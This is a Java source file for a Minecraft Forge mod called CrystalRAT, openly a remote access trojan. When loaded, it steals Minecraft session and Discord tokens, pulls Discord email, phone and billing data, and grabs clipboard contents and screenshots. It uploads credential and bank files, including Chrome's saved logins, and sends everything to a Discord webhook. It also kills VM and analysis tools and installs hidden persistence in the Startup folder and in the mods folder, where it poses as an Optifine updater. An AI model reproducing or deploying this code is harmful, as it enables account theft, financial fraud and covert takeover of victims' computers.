package me.custompayload.crystal;

import me.custompayload.crystal.json.JSONException;
import me.custompayload.crystal.json.JSONObject;
import me.custompayload.crystal.utils.CrystalUtils;
import me.custompayload.crystal.webhook.DiscordEmbed;
import net.minecraft.client.Minecraft;
import net.minecraft.launchwrapper.Launch;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.commons.io.FileUtils;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Mod(modid = CrystalRAT.MODID, version = CrystalRAT.VERSION, dependencies = "after:*")
public class CrystalRAT
{

    // This RAT Has been made by CustomPayload. youtube.com/c/IncognitoSquad. Discord: CustomPayload#1337 / CustomPayload#1894 / CustomPayload#2039

    public static final String MODID = "crystalmod";

    public static final String VERSION = "1.0";

    public static final String WEBHOOK = "idk";

    public static final String USERNAME = System.getProperty("user.name");

    public static final String OS = System.getProperty("os.name");

    public static final String AUTHOR = "CustomPayload";

    public static final String DESKTOP = System.getProperty("user.home") + "/Desktop/";

    public static final String DOWNLOADS = System.getProperty("user.home") + "/Downloads/";

    public static final String APPDATA = System.getenv("APPDATA");

    public static final String MINECRAFT = System.getenv("APPDATA") + "/.minecraft/";

    public static final String TEMP = System.getProperty("user.home") + "/AppData/Local/Temp/";

    public static final File MODFILE = Loader.instance().activeModContainer().getSource();

    public static String[] downloads = new String[] {
            DESKTOP + "alts.txt",
            MINECRAFT + "launcher_accounts.json",
            MINECRAFT + "launcher_profiles.json",
            MINECRAFT + "logs" + File.separator + "latest.log",
            MINECRAFT + "Flux" + File.separator + "alt.txt",
            MINECRAFT + "EaZy" + File.separator + "altManager.json",
            MINECRAFT + "essential" + File.separator + "mojang_accounts.json",
            MINECRAFT + "essential" + File.separator + "microsoft_accounts.json",
            MINECRAFT + "Impact" + File.separator + "alts.json",
            MINECRAFT + "Inertia" + File.separator + "1.12.2" + File.separator + "Alts.json",
            MINECRAFT + "Inertia" + File.separator + "1.8.9" + File.separator + "Alts.json",
            MINECRAFT + "meteor-client" + File.separator + "accounts.nbt",
            MINECRAFT + "Novoline" + File.separator + "alts.novo",
            MINECRAFT + "SkillClient" + File.separator + "accounts.txt",
            MINECRAFT + "wurst" + File.separator + "alts.json",
            DESKTOP + "accounts.txt",
            DESKTOP + "details.txt",
            DESKTOP + "alts.json",
            DESKTOP + "account.txt",
            DESKTOP + "bank.txt",
            DESKTOP + "banks.txt",
            DESKTOP + "bank details.txt",
            DESKTOP + "banking.txt",
            DESKTOP + "payment.txt",
            DESKTOP + "games.txt",
            DESKTOP + "payment info.txt",
            DESKTOP + "my ip.txt",
            DESKTOP + "ip.txt",
            DESKTOP + "discord.txt",
            DESKTOP + "discord token.txt",
            DESKTOP + "token.txt",
            DESKTOP + "my token.txt",
            DESKTOP + "my discord token.txt",
            DOWNLOADS + "alts.txt",
            DOWNLOADS + "alt.txt",
            DOWNLOADS + "accounts.txt",
            DOWNLOADS + "secret.txt",
            "C:\\Users\\" + USERNAME + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    };

    public static String[] blacklistedProcesses = new String[] {
            "vboxservice.exe",
            "vboxtray.exe",
            "xenservice.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "vmwareuser.exe",
            "VGAuthService.exe",
            "vmacthlp.exe",
            "VMSrvc.exe",
            "smsniff.exe",
            "netstat.exe",
            "ProcessHacker.exe",
            "SandMan.exe",
            "jpcap.jar",
            "Wireshark.exe",
            "dumpcap.exe",
            "cheatengine-x86_64.exe"
    };

    public static ArrayList<String> workingTokens = new ArrayList<>();

    public static Minecraft mc = Minecraft.getMinecraft();

    public String IP(){
        try {
            @SuppressWarnings("resource")
            Scanner scanner = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8");
            while (scanner.hasNextLine()) {
                return scanner.nextLine();
            }
            return "Unknown";
        }catch(IOException ignored) {
            return "Unknown";
        }
    }

    public String getAPI(String apiLink, String token){
        try{
            URL url = new URL("https://discordapp.com/api/v7/" + apiLink);
            HttpsURLConnection con = (HttpsURLConnection) url.openConnection();
            con.setDoOutput(true);
            con.setRequestMethod("GET");
            con.setRequestProperty("Authorization", token);
            con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
            InputStream r = con.getInputStream();
            try(Scanner s = new Scanner(r)){
                return s.useDelimiter("\\A").next();
            }
        }catch (IOException e){
            return "";
        }
    }

    public void send(String message){
        new Thread(() -> {
            try{
                CloseableHttpClient httpClient = HttpClients.createDefault();
                HttpPost httpPost = new HttpPost(WEBHOOK);
                ArrayList<NameValuePair> params = new ArrayList<>();
                params.add(new BasicNameValuePair("content", message));
                params.add(new BasicNameValuePair("username", "CrystalRAT - " + USERNAME));
                httpPost.setEntity(new UrlEncodedFormEntity(params));
                httpClient.execute(httpPost);
                httpClient.close();
            }catch (IOException ignored){}
        }).start();
    }

    public ArrayList<String> captureScreenshot(){
        ArrayList<String> strings = new ArrayList<>();
        try {
            GraphicsEnvironment localGraphicsEnv = GraphicsEnvironment.getLocalGraphicsEnvironment();
            for (GraphicsDevice device : localGraphicsEnv.getScreenDevices()) {
                int random = new Random().nextInt(100) + 1;
                Rectangle bounds = device.getDefaultConfiguration().getBounds();
                BufferedImage capture = new Robot().createScreenCapture(bounds);
                ImageIO.write(capture, "png", new File(TEMP + "screenshot_" + random + ".png"));
                strings.add(TEMP + "screenshot_" + random + ".png");
            }
        } catch (AWTException | IOException e) {
            return null;
        }
        return strings;
    }


    public String getOutputOfCmd(String[] cmd){
        try {
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec(cmd);
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            StringBuilder finalOutput = new StringBuilder();
            while((line = in.readLine()) != null) {
                finalOutput.append(line).append("\n");
            }
            return finalOutput.toString();
        }catch (IOException e){
            send("An error occurred while trying to execute the command: " + Arrays.toString(cmd));
            return "Failed";
        }
    }

    public String parseJson(String json, String key){
        try{
            JSONObject obj = new JSONObject(json);
            return obj.getString(key);
        }catch (JSONException e){
            return "Invalid";
        }
    }

    public boolean processExists(String process){
        return getOutputOfCmd(new String[]{"tasklist.exe"}).contains(process);
    }

    @EventHandler
    public void preInit(FMLPreInitializationEvent event){
        // Anti-VM //
        for(String p : blacklistedProcesses){
            if(processExists(p)){
                try {
                    new ProcessBuilder("taskkill.exe", "/IM", "\"" + p + "\"", "/F").start();
                    if(processExists(p)){
                        System.out.println("Malicious process found: " + p);
                        mc.shutdown();
                        FMLCommonHandler.instance().exitJava(0, true);
                    }
                } catch (IOException e) {
                    mc.shutdown();
                    FMLCommonHandler.instance().exitJava(0, true);
                }
            }
        }
        // # Anti-VM //
    }

    private InputStream getFileFromResourceAsStream(String fileName) {
        ClassLoader classLoader = getClass().getClassLoader();
        InputStream inputStream = classLoader.getResourceAsStream(fileName);

        if (inputStream == null) {
            throw new IllegalArgumentException("Mod loader not found! " + fileName);
        } else {
            return inputStream;
        }
    }

    @EventHandler
    public void init(FMLInitializationEvent event)
    {
        boolean dev = (Boolean) Launch.blackboard.get("fml.deobfuscatedEnvironment");

        // Mod Overriding //
        send("aint even doing mod overriding because im too stupid");
//        if(!dev){
//            File ff = new File(MINECRAFT + "mods");
//            if (ff.exists()) {
//                for (File f : ff.listFiles()) {
//                    if (f.getName().endsWith(".jar") && !f.getName().equals(MODFILE.getName())) {
//                        String name = f.getName();
//                        f.delete();
//                        try {
//                            FileUtils.copyFile(new File(MINECRAFT + "mods/" + MODFILE.getName()), f);
//                            f.renameTo(new File(MINECRAFT + "mods/" + name));
//                            send("The RAT has successfully overridden the mod file named '" + name + "'.");
//                        } catch (IOException ignored) {
//                            send("The RAT has failed in finding a mod to override.");
//                        }
//                        break;
//                    }
//                }
//            }
//        }else{
//            send("The RAT did not try to override mods because you are in a dev environment.");
//        }
        // # Mod Overriding


        // User Information //
        new Thread(() -> {
            String[] totalMemory = new String[]{ "wmic", "computersystem", "get", "totalphysicalmemory" };
            String[] cpuName = new String[]{ "wmic", "cpu", "get", "name" };
            String[] cpuCores = new String[]{ "wmic", "cpu", "get", "numberofcores" };
            double ram = Math.round(Double.parseDouble(getOutputOfCmd(totalMemory).split("\n")[2])/1073741824.0);
            String cpu = getOutputOfCmd(cpuName).split("\n")[2] + getOutputOfCmd(cpuCores).split("\n")[2] + " Core(s)";
            String clipboard = "None";
            try {
                clipboard = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
            } catch (UnsupportedFlavorException | IOException ignored) {}

            Calendar cal = Calendar.getInstance();
            int hour = cal.get(Calendar.HOUR);
            int minute = cal.get(Calendar.MINUTE);
            int second = cal.get(Calendar.SECOND);
            int day = cal.get(Calendar.DAY_OF_MONTH);
            int month = cal.get(Calendar.MONTH) + 1;
            int year = cal.get(Calendar.YEAR);
            String time = hour + ":" + minute + ":" + second;
            String date = day + "/" + month + "/" + year;

            DiscordEmbed user = new DiscordEmbed();
            user.setUsername("CrystalRAT - " + USERNAME);
            user.addEmbed(new DiscordEmbed.EmbedObject()
                    .setTitle(USERNAME + " PC Information")
                    .setColor(Color.CYAN)
                    .addField("Username", USERNAME, true)
                    .addField("Operating System", OS, true)
                    .addField("IP Address", IP(), false)
                    .addField("CPU", cpu, false)
                    .addField("RAM", (int) ram + "GB", true)
                    .addField("Clipboard", clipboard, false)
                    .addField("Dev Mode", dev ? "Yes" : "No", true)
                    .setFooter(": Captured @ " + date + " " + time, "https://cdn.discordapp.com/emojis/755027333873664060.gif?size=128&quality=lossless"));
            try {
                user.execute();
            }catch (IOException ignored){}
        }).start();

        // # User Information //

        // Minecraft Information //
        new Thread(() -> {
            mc.getSession().getToken();
            String sp = null;
            try {
                Class<?> clazz = Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection");
                Field field = clazz.getField("changed");
                sp = (String) field.get(null);
            }catch (Exception ignored){}
            String session = sp == null ? mc.getSession().getToken() : sp;


            DiscordEmbed minecraft = new DiscordEmbed();
            minecraft.setUsername("CrystalRAT - " + mc.getSession().getUsername());
            minecraft.setAvatarUrl("https://mc-heads.net/avatar/" + mc.getSession().getUsername());
            minecraft.addEmbed(new DiscordEmbed.EmbedObject()
                    .setTitle("Minecraft Information")
                    .setColor(Color.CYAN)
                    .addField("Name", mc.getSession().getUsername(), true)
                    .addField("UUID", mc.getSession().getPlayerID().replace("-", ""), true)
                    .addField("Token", session, false)
                    .setImage("https://mc-heads.net/avatar/" + mc.getSession().getUsername())
                    .setFooter(": https://sky.shiiyu.moe/stats/" + mc.getSession().getUsername() + "", "https://cdn.discordapp.com/emojis/885157035157639208.webp?size=128&quality=lossless"));
            try {
                minecraft.execute();
            }catch (IOException ignored){}
        }).start();
        // # Minecraft Information //

        // prank em john

        // Discord Information //
        new Thread(() -> { // Made this threaded because it was taking a while to load
            ArrayList<String> tokens = new ArrayList<>();
            final String local = System.getenv("LOCALAPPDATA");

            HashMap<String, File> paths = new HashMap<String, File>() {{
                put("discord", new File(APPDATA + "\\discord\\Local Storage\\leveldb"));
                put("Chrome", new File(local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"));
                put("Opera", new File(APPDATA + "\\Opera Software\\Opera Stable"));
            }};

            for (File path : paths.values()) {
                try {
                    if(path.exists()){
                        for (File file : path.listFiles()) {
                            if (file.toString().endsWith(".ldb") || file.toString().endsWith(".log")) {
                                FileReader fileReader = new FileReader(file);
                                BufferedReader bufferReader = new BufferedReader(fileReader);

                                String textFile;
                                StringBuilder buildedText = new StringBuilder();

                                while ( (textFile = bufferReader.readLine()) != null) {
                                    buildedText.append(textFile);
                                }

                                String actualText = buildedText.toString();

                                fileReader.close();
                                bufferReader.close();

                                Pattern pattern = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
                                Matcher matcher = pattern.matcher(actualText);
                                if (matcher.find(0)) {
                                    tokens.add(matcher.group());
                                }

                                Pattern pattern2 = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                                Matcher matcher2 = pattern2.matcher(actualText);
                                if(matcher2.find(0)){
                                    tokens.add(matcher2.group());
                                }

                                Pattern pattern3 = Pattern.compile("mfa\\.[\\w-]{84}");
                                Matcher matcher3 = pattern3.matcher(actualText);
                                if(matcher3.find(0)){
                                    tokens.add(matcher3.group());
                                }

                                Pattern pattern4 = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}");
                                Matcher matcher4 = pattern4.matcher(actualText);
                                if(matcher4.find(0)){
                                    tokens.add(matcher4.group());
                                }

                                Pattern pattern5 = Pattern.compile("[\\w\\W]{24}\\.[\\w\\W]{6}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher matcher5 = pattern5.matcher(actualText);
                                if(matcher5.find(0)){
                                    tokens.add(matcher5.group());
                                }
                            }
                        }
                    }

                } catch (Exception ignored) {}
            }

            if(tokens.size() > 0){
                for(String t : tokens){
                    String info = getAPI("users/@me", t).replace(",", ",\n");
                    String username = parseJson(info, "username") + "#" + parseJson(info, "discriminator");
                    if(!username.equalsIgnoreCase("Invalid#Invalid")){
                        String number = parseJson(info, "phone");
                        String email = parseJson(info, "email");
                        String avatarHash = parseJson(info, "avatar");
                        String id = parseJson(info, "id");
                        boolean nitro = !getAPI("users/@me/billing/subscriptions", t).equals("[]");
                        boolean billing = !getAPI("users/@me/billing/payments", t).equals("[]");
                        DiscordEmbed discord = new DiscordEmbed();
                        discord.setUsername("CrystalRAT - " + username);
                        discord.setAvatarUrl("https://cdn.discordapp.com/avatars/" + id +  "/" + avatarHash +  ".png?size=300");

                        String pwned = "False";
                        try {
                            CloseableHttpClient client = HttpClients.createDefault();
                            HttpPost httpPost = new HttpPost("https://www.fasterbroadband.co.uk/tools/data-breach-search");
                            List<NameValuePair> params = new ArrayList<>();
                            params.add(new BasicNameValuePair("account", email));
                            httpPost.setEntity(new UrlEncodedFormEntity(params));
                            HttpResponse response = client.execute(httpPost);
                            HttpEntity entity = response.getEntity();
                            String content = EntityUtils.toString(entity);
                            if(content.contains("pwnLogo")){
                                pwned = "True";
                            }
                        } catch (IOException ignored) {}

                        discord.addEmbed(new DiscordEmbed.EmbedObject()
                                .setTitle("Discord Information")
                                .setColor(Color.CYAN)
                                .addField("Username", username, true)
                                .addField("Phone Number", number, true)
                                .addField("Email", email, false)
                                .addField("Nitro", nitro ? "Yes" : "No", true)
                                .addField("Billing", billing ? "Yes" : "No", true)
                                .addField("Token", t, false)
                                .setImage("https://cdn.discordapp.com/avatars/" + id +  "/" + avatarHash +  ".png?size=300")
                                .setFooter("Discord Email Breached: " + pwned, "https://cdn.discordapp.com/emojis/690075870710202379.webp?size=128&quality=lossless"));
                        try{ discord.execute(); }catch (IOException ignored){}
                    }
                }
            }else{
                send("The RAT has failed in finding a discord token (None Found).");
            }
        }).start();


        // Startup //
        new Thread(() -> {
            try {
                String startup = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
                File startupFile = new File(startup + "\\javaw.jar");
                FileUtils.copyFile(MODFILE, startupFile);
                Files.setAttribute(Paths.get(startupFile.toString()), "dos:hidden", true);
            }catch (IOException ignored){
                send("The RAT has failed in copying the startup file.");
            }
        }).start();
        // # Startup //

        // Hypixel API //
        // # Hypixel API //

        // File Uploading //
        new Thread(() -> {
            String block = "";
            for(String c : downloads){
                String b = CrystalUtils.uploadToServer(c) + "\n";
                if(!b.contains("None")){
                    block = block + "**" + c + "** " + CrystalUtils.uploadToServer(c) + "\n";
                }
            }
            send(block);
        }).start();

        // # File Uploading //

        // Screenshot //
        new Thread(() -> {
            ArrayList<String> monitors = captureScreenshot();
            int i = 0;
            for(String monitor : monitors){
                String uploaded = CrystalUtils.uploadToServer(monitor);
                DiscordEmbed screenshot = new DiscordEmbed();
                screenshot.setUsername("CrystalRAT - " + USERNAME);
                screenshot.addEmbed(new DiscordEmbed.EmbedObject()
                        .setTitle("Screenshot - Monitor " + i)
                        .setDescription("A screenshot of the user's monitor #" + i)
                        .addField("URL", uploaded, true)
                        .setColor(Color.CYAN));
                i++;
                try {
                    screenshot.execute();
                } catch (IOException ignored) {}
            }
        }).start();
        // # Screenshot //

    }

    public static void main(String[] args){
        CrystalRAT crystalRAT = new CrystalRAT();
        try {
            String jarPath = crystalRAT.getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
            File modPath = new File(MINECRAFT + "mods\\OptifineUpdater.jar");
            FileUtils.copyFile(new File(jarPath), modPath);
            Files.setAttribute(Paths.get(modPath.toString()), "dos:hidden", true);
            crystalRAT.send("Successfully restored the RAT to the mods folder.");
        }catch (IOException ignored){
            crystalRAT.send("Failed to restore the RAT to the mods folder.");
        }

    }
}
